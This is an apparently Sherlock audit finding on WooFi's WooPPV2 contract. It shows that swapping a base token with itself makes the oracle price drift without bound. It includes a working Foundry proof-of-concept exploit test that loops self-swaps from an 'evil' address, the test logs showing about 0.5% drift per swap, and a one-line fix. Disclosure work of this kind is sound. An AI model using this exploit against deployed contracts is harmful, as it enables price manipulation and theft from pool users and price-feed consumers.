Tangy Gunmetal Robin

high

# Price manipulation by swapping any ````baseToken```` with itself

## Summary
````WooPPV2.swap()```` doesn't forbid the case that ````fromToken == toToken == baseToken````, attackers can make any ````baseToken````'s price unboundedly drifting away by swapping with self.

## Vulnerability Detail
The issue arises due to incorrect logic in ````WooPPV2._swapBaseToBase()````:
1. Firstly, we can see the situation that ````fromToken == toToken == baseToken```` can pass the checks on L521\~L522.
2. ````baseToken````'s state & price is cached in memory on L527\~L528, and updated first time on L541, but the price calculation on L555 still uses the cached state, and the ````newBase2Price```` is set to ````wooracle```` on L556 as the final price after the swap.

As a result, swapping ````baseToken```` with itself will cause a net price drift rather than keeping price unchanged.
```solidity
File: contracts\WooPPV2.sol
513:     function _swapBaseToBase(
...
520:     ) private nonReentrant whenNotPaused returns (uint256 base2Amount) {
521:         require(baseToken1 != address(0) && baseToken1 != quoteToken, "WooPPV2: !baseToken1");
522:         require(baseToken2 != address(0) && baseToken2 != quoteToken, "WooPPV2: !baseToken2");
...
527:         IWooracleV2.State memory state1 = IWooracleV2(wooracle).state(baseToken1);
528:         IWooracleV2.State memory state2 = IWooracleV2(wooracle).state(baseToken2);
...
539:             uint256 newBase1Price;
540:             (quoteAmount, newBase1Price) = _calcQuoteAmountSellBase(baseToken1, base1Amount, state1);
541:             IWooracleV2(wooracle).postPrice(baseToken1, uint128(newBase1Price));
...
554:             uint256 newBase2Price;
555:             (base2Amount, newBase2Price) = _calcBaseAmountSellQuote(baseToken2, quoteAmount, state2);
556:             IWooracleV2(wooracle).postPrice(baseToken2, uint128(newBase2Price));
...
578:     }

```

The following coded PoC intuitively shows the problem with a specific case:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../../lib/forge-std/src/Test.sol";
import {console2} from "../../lib/forge-std/src/console2.sol";
import {WooracleV2_2} from "../../contracts/wooracle/WooracleV2_2.sol";
import {WooPPV2} from "../../contracts/WooPPV2.sol";
import {TestERC20Token} from "../../contracts/test/TestERC20Token.sol";
import {TestUsdtToken} from "../../contracts/test/TestUsdtToken.sol";

contract TestWbctToken is TestERC20Token {
    function decimals() public view virtual override returns (uint8) {
        return 8;
    }
}

contract PriceManipulationAttackTest is Test {
    WooracleV2_2 oracle;
    WooPPV2 pool;
    TestUsdtToken usdt;
    TestWbctToken wbtc;
    address evil = address(0xbad);

    function setUp() public {
        usdt = new TestUsdtToken();
        wbtc = new TestWbctToken();
        oracle = new WooracleV2_2();
        pool = new WooPPV2(address(usdt));

        // parameters reference: Integration_WooPP_Fee_Rebate_Vault.test.ts
        pool.setMaxGamma(address(wbtc), 0.1e18);
        pool.setMaxNotionalSwap(address(wbtc), 5_000_000e6);
        pool.setFeeRate(address(wbtc), 25);
        oracle.postState({_base: address(wbtc), _price: 50_000e8, _spread: 0.001e18, _coeff: 0.000000001e18});
        oracle.setWooPP(address(pool));
        oracle.setAdmin(address(pool), true);
        pool.setWooracle(address(oracle));

        // add some initial liquidity
        usdt.mint(address(this), 10_000_000e6);
        usdt.approve(address(pool), type(uint256).max);
        pool.depositAll(address(usdt));

        wbtc.mint(address(this), 100e8);
        wbtc.approve(address(pool), type(uint256).max);
        pool.depositAll(address(wbtc));
    }

    function testMaxPriceDriftInNormalCase() public {
        (uint256 initPrice, bool feasible) = oracle.price(address(wbtc));
        assertTrue(feasible);
        assertEq(initPrice, 50_000e8);

        // buy almost all wbtc in pool
        usdt.mint(address(this), 5_000_000e6);
        usdt.transfer(address(pool), 5_000_000e6);
        pool.swap({
            fromToken: address(usdt),
            toToken: address(wbtc),
            fromAmount: 5_000_000e6,
            minToAmount: 0,
            to: address(this),
            rebateTo: address(this)
        });

        (uint256 pastPrice, bool feasible2) = oracle.price(address(wbtc));
        assertTrue(feasible2);
        uint256 drift = ((pastPrice - initPrice) * 1e5) / initPrice;
        assertEq(drift, 502); // 0.502%
        console2.log("Max price drift in normal case: ", _toPercentString(drift));
    }

    function testUnboundPriceDriftInAttackCase() public {
        (uint256 initPrice, bool feasible) = oracle.price(address(wbtc));
        assertTrue(feasible);
        assertEq(initPrice, 50_000e8);

        // top up the evil, in real case, the fund could be from a flashloan
        wbtc.mint(evil, 100e8);

        for (uint256 i; i < 10; ++i) {
            vm.startPrank(evil);
            uint256 balance = wbtc.balanceOf(evil);
            wbtc.transfer(address(pool), balance);
            pool.swap({
                fromToken: address(wbtc),
                toToken: address(wbtc),
                fromAmount: balance,
                minToAmount: 0,
                to: evil,
                rebateTo: evil
            });
            (uint256 pastPrice, bool feasible2) = oracle.price(address(wbtc));
            assertTrue(feasible2);
            uint256 drift = ((pastPrice - initPrice) * 1e5) / initPrice;
            console2.log("Unbound price drift in attack case: ", _toPercentString(drift));    
            vm.stopPrank();
        }
    }

    function _toPercentString(uint256 drift) internal pure returns (string memory result) {
        uint256 d_3 = drift % 10;
        uint256 d_2 = (drift / 10) % 10;
        uint256 d_1 = (drift / 100) % 10;
        uint256 d0 = (drift / 1000) % 10;
        result = string.concat(_toString(d0), ".", _toString(d_1), _toString(d_2), _toString(d_3), "%");
        uint256 d = drift / 10000;
        while (d > 0) {
            result = string.concat(_toString(d % 10), result);
            d = d / 10;
        }
    }

    function _toString(uint256 digital) internal pure returns (string memory str) {
        str = new string(1);
        bytes16 symbols = "0123456789abcdef";
        assembly {
            mstore8(add(str, 32), byte(digital, symbols))
        }
    }
}
```

And the logs:
```solidity
2024-03-woofi-swap\WooPoolV2> forge test --match-contract PriceManipulationAttackTest -vv
[⠆] Compiling...No files changed, compilation skipped
[⠰] Compiling...

Running 2 tests for test/foundry/PriceManipulationAttack.t.sol:PriceManipulationAttackTest
[PASS] testMaxPriceDriftInNormalCase() (gas: 158149)
Logs:
  Max price drift in normal case:  0.502%

[PASS] testUnboundPriceDriftInAttackCase() (gas: 648243)
Logs:
  Unbound price drift in attack case:  0.499%
  Unbound price drift in attack case:  0.998%
  Unbound price drift in attack case:  1.496%
  Unbound price drift in attack case:  1.994%
  Unbound price drift in attack case:  2.491%
  Unbound price drift in attack case:  2.988%
  Unbound price drift in attack case:  3.483%
  Unbound price drift in attack case:  3.978%
  Unbound price drift in attack case:  4.473%
  Unbound price drift in attack case:  4.967%

Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 6.59ms

Ran 1 test suites: 2 tests passed, 0 failed, 0 skipped (2 total tests)
```


## Impact
Acccording ````WooFI```` doc (https://learn.woo.org/v/woofi-dev-docs/resources/on-chain-price-feeds), the ````Wooracle```` is intended to work as a price feed infrastructure for both ````WooFI````'s other components and third parties. This bug would cause all related consumer APPs suffering potential price manipulation attack.

## Code Snippet
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L513

## Tool used

Manual Review

## Recommendation

```diff
2024-03-woofi-swap\WooPoolV2> git diff
diff --git a/WooPoolV2/contracts/WooPPV2.sol b/WooPoolV2/contracts/WooPPV2.sol
index e7a6ae8..9440089 100644
--- a/WooPoolV2/contracts/WooPPV2.sol
+++ b/WooPoolV2/contracts/WooPPV2.sol
@@ -520,6 +520,7 @@ contract WooPPV2 is Ownable, ReentrancyGuard, Pausable, IWooPPV2 {
     ) private nonReentrant whenNotPaused returns (uint256 base2Amount) {
         require(baseToken1 != address(0) && baseToken1 != quoteToken, "WooPPV2: !baseToken1");
         require(baseToken2 != address(0) && baseToken2 != quoteToken, "WooPPV2: !baseToken2");
+        require(baseToken1 != baseToken2, "WooPPV2: baseToken1 == baseToken2");
         require(to != address(0), "WooPPV2: !to");

         require(balance(baseToken1) - tokenInfos[baseToken1].reserve >= base1Amount, "WooPPV2: !BASE1_BALANCE");
```
